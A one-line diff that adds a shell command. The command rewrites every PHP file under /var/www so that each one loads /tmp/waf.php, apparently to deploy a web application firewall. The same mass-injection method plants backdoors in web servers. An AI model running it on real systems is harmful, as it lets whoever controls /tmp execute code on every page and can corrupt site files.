@@ -1,0 +1,1 @@
+find /var/www/ -type f -path "*.php" | xargs sed -i "s/<?php/<?php\nrequire_once('\/tmp\/waf.php');\n/g"
